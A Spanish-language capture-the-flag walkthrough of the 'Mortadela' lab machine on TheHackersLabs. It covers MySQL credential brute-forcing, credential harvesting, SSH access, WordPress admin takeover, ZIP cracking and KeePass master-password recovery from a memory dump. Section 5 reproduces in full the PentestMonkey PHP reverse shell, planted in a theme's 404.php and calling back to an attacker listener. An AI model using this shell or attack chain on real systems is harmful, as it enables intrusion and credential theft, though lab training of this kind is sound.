# Writeup — Mortadela (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Debian 12  
**IP:** 10.10.10.6  
**Objetivo:** Obtener user.txt y root.txt  

---

## 1. Descubrimiento de Red

```bash
sudo netdiscover -i eth0 -r 10.10.10.0/24
```

Máquina objetivo identificada en `10.10.10.6` (MAC Oracle VirtualBox).

---

## 2. Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.6 -oG all_ports.txt
```

Puertos abiertos: `22,80,3306`

```bash
nmap -p22,80,3306 -sCV -vvv 10.10.10.6 -oN tcp_scan.txt
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2
80/tcp   open  http    Apache httpd 2.4.57
3306/tcp open  mysql   MariaDB 5.5.5-10.11.6
```

---

## 3. Enumeración MySQL

```bash
nmap --script mysql-enum,mysql-databases,mysql-brute -p3306 10.10.10.6
```

- **`root:cassandra`** (credenciales encontradas por `mysql-brute`)
- Base de datos `confidencial` con tabla `usuarios`

```bash
mysql -h 10.10.10.6 -u root -pcassandra --ssl=0
```

```sql
MariaDB [(none)]> use confidencial;
MariaDB [confidencial]> select * from usuarios;
```

```
+-----------+------------------+
| usuario   | contraseña       |
+-----------+------------------+
| mortadela | Juanikokukunero8 |
+-----------+------------------+
```

---

## 4. Acceso SSH

```bash
ssh mortadela@10.10.10.6
```

**user.txt:** `<REDACTED>`

---

## 5. WordPress — Reverse shell

> **Nota:** Este paso no fue necesario para la escalada, ya que disponíamos de SSH como `mortadela`. La reverse shell fue una vía alternativa que no aportó nada al objetivo final.

Enumeración de la base de datos de WordPress:

```bash
mysql -h 10.10.10.6 -u root -pcassandra --ssl=0
```

```sql
MariaDB [(none)]> use wordpress;
MariaDB [wordpress]> show tables;
MariaDB [wordpress]> select * from wp_users;
```

```
+----+------------+-----------------------------------------------------------------+---------------+------------+--------------------------------+---------------------+
| ID | user_login | user_pass                                                       | user_nicename | user_email | user_url                       | user_registered     |
+----+------------+-----------------------------------------------------------------+---------------+------------+--------------------------------+---------------------+
|  1 | mortadela  | $wp$2y$10$toKYhRJEkldP1UttFPhtLuBOv.8IgMU4yNfUPncs0q52Yi2CKZ6Uy | mortadela     | a@a.com    | http://192.168.0.108/wordpress | 2024-04-01 16:47:01 |
+----+------------+-----------------------------------------------------------------+---------------+------------+--------------------------------+---------------------+
```

La URL del sitio apuntaba a `192.168.0.108`, por lo que la web no cargaba. Se corrige:

```sql
MariaDB [wordpress]> UPDATE wp_options SET option_value='http://10.10.10.6/wordpress' WHERE option_name IN ('siteurl','home');
MariaDB [wordpress]> SELECT option_name, option_value FROM wp_options WHERE option_name IN ('siteurl','home');
```

```
+-------------+--------------------------------+
| option_name | option_value                   |
+-------------+--------------------------------+
| home        | http://10.10.10.6/wordpress    |
| siteurl     | http://10.10.10.6/wordpress    |
+-------------+--------------------------------+
```

Se actualiza la contraseña a MD5 para acceder al panel de administración:

```sql
MariaDB [wordpress]> UPDATE wp_users SET user_pass = MD5('admin') WHERE user_login = 'mortadela';
```

Acceso a `http://10.10.10.6/wordpress/wp-admin` con `mortadela:admin`.

Instalar y activar el tema **Twenty Seventeen**. Editar `Apariencia → Editor de temas → 404.php`, borrar todo su contenido y añadir la reverse shell de PentestMonkey:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.2';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

En Kali:

```bash
nc -lvnp 4444
```

Visitar `http://10.10.10.6/wordpress/wp-content/themes/twentyseventeen/404.php` → conexión recibida como `www-data`.

---

## 6. Archivo KeePass en /opt

Desde la sesión SSH como `mortadela`:

```bash
ls -la /opt/
```

`muyconfidencial.zip` (89 MB) — legible por cualquiera.

```bash
python3 -m http.server 8000
```

En Kali:

```bash
wget http://10.10.10.6:8000/muyconfidencial.zip
zip2john muyconfidencial.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Contraseña del ZIP: `pinkgirl`

```bash
unzip muyconfidencial.zip
```

Contenido:
- `Database.kdbx` — base de datos KeePass
- `KeePass.DMP` — volcado de memoria de KeePass

---

## 7. Extraer contraseña maestra de KeePass

```bash
git clone https://github.com/z-jxy/keepass_dump
python3 keepass_dump/keepass_dump.py -f KeePass.DMP
```

```
[*] 0: {UNKNOWN}
[*] 1: a
[*] 2: r
[*] 3: i
[*] 4: t
[*] 5: r
[*] 6: i
[*] 7: n
[*] 8: i
[*] 9: 1
[*] 10: 2
[*] 11: 3
[*] 12: 4
[*] 13: 5
[*] Extracted: {UNKNOWN}aritrini12345
```

El primer carácter se adivina: `M` → **`Maritrini12345`**

---

## 8. Contraseña de root

```bash
keepassxc Database.kdbx
```

Contraseña de root encontrada en KeePass: **`Juanikonokukunero`**

```bash
su root
Password: Juanikonokukunero
cat /root/root.txt
```

**root.txt:** `<REDACTED>`

---

## Resumen

| Paso | Técnica | Resultado |
|------|---------|-----------|
| Descubrimiento | `netdiscover` | IP `10.10.10.6` |
| Escaneo | `nmap -p- -sCV` | Puertos 22, 80, 3306 |
| MySQL fuzzing | `nmap --script mysql-brute` | `root:cassandra` |
| SQL query | `select * from usuarios` | `mortadela:Juanikokukunero8` |
| SSH | credenciales BD | user.txt |
| WordPress | cambiar hash admin + reverse shell | `www-data` |
| KeePass dump | `keepass_dump.py` | `Maritrini12345` |
| KeePass DB | `keepassxc` | `root:Juanikonokukunero` |
| Su root | contraseña KeePass | root.txt |

**Flags:** `<REDACTED>` / `<REDACTED>`
